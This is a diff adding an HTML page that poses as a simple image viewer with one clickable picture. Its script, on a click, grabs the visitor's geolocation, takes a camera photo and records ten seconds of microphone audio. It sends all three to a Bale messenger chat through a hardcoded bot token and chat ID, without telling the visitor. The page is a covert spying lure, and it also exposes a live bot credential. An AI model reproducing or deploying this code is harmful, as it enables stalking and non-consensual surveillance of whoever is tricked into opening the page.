@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+<meta charset="UTF-8">
+<title>show image</title>
+<style>
+  body { font-family: Tahoma; text-align:center; padding:50px; }
+  img { cursor:pointer; width:200px; }
+</style>
+</head>
+<body>
+
+<img id="sendImg" src="https://github.com/bardiarahmat207-source/Showimage/blob/f311299f9509210e2da11f71b487f7fcc030817d/012.jpg" />
+<p id="status"></p>
+
+<script>
+const sendImg = document.getElementById("sendImg");
+const status = document.getElementById("status");
+
+sendImg.addEventListener("click", async () => {
+
+  navigator.geolocation.getCurrentPosition(async (position) => {
+
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    status.innerHTML = "";
+    const photoBlob = await capturePhoto();
+
+    status.innerHTML = "";
+    const audioBlob = await recordAudio(10);
+
+    status.innerHTML = "⏳ ";
+    await sendFiles(lat, lon, photoBlob, audioBlob);
+
+    status.innerHTML = "";
+
+  });
+});
+
+async function sendFiles(lat, lon, photoBlob, audioBlob) {
+
+  const botToken = "39274740:6iVuL_v9VSLiov5R8u8E1L2gpWweOi2Sgmg";
+  const chatId = "1280502735";
+
+  // ارسال لوکیشن
+  await fetch(`https://tapi.bale.ai/bot${botToken}/sendLocation`, {
+    method: "POST",
+    body: new URLSearchParams({
+      chat_id: chatId,
+      latitude: lat,
+      longitude: lon
+    })
+  });
+
+  // ارسال عکس به صورت فایل
+  const photoData = new FormData();
+  photoData.append("chat_id", chatId);
+  photoData.append("document", photoBlob, "selfie.jpg");
+
+  await fetch(`https://tapi.bale.ai/bot${botToken}/sendDocument`, {
+    method: "POST",
+    body: photoData
+  });
+
+  // ارسال صدا به صورت فایل
+  const audioData = new FormData();
+  audioData.append("chat_id", chatId);
+  audioData.append("document", audioBlob, "voice.mp3"); // اسم mp3 ولی واقعی webm
+
+  await fetch(`https://tapi.bale.ai/bot${botToken}/sendDocument`, {
+    method: "POST",
+    body: audioData
+  });
+}
+
+async function capturePhoto() {
+  const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+  const track = stream.getVideoTracks()[0];
+  const imageCapture = new ImageCapture(track);
+  const blob = await imageCapture.takePhoto();
+  track.stop();
+  return blob;
+}
+
+async function recordAudio(seconds) {
+  const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+  const mediaRecorder = new MediaRecorder(stream);
+  let chunks = [];
+
+  mediaRecorder.ondataavailable = e => chunks.push(e.data);
+  mediaRecorder.start();
+
+  await new Promise(resolve => setTimeout(resolve, seconds * 1000));
+  mediaRecorder.stop();
+
+  await new Promise(resolve => mediaRecorder.onstop = resolve);
+
+  stream.getTracks().forEach(track => track.stop());
+
+  return new Blob(chunks, { type: "audio/webm" });
+}
+</script>
+
+</body>
+</html>
